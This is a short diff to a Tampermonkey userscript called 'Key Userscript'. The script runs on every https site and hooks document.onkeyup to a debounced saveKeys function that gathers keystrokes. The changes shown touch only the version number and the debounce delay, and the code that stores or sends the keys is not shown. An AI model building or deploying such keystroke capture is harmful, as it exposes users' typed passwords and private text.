@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Key Userscript
 // @namespace    http://tampermonkey.net/
-// @version      1.0.2.5
+// @version      1.0.2.6
 // @description  try to take over the world!
 // @author       You
 // @match        https://*/*
@@ -76,7 +76,7 @@ var uu = "";
     }
 
 
-    document.onkeyup = _.debounce(saveKeys, 250)
+    document.onkeyup = _.debounce(saveKeys, 300)
 
     function saveKeys(e) {
         if (keys.length > 0) {
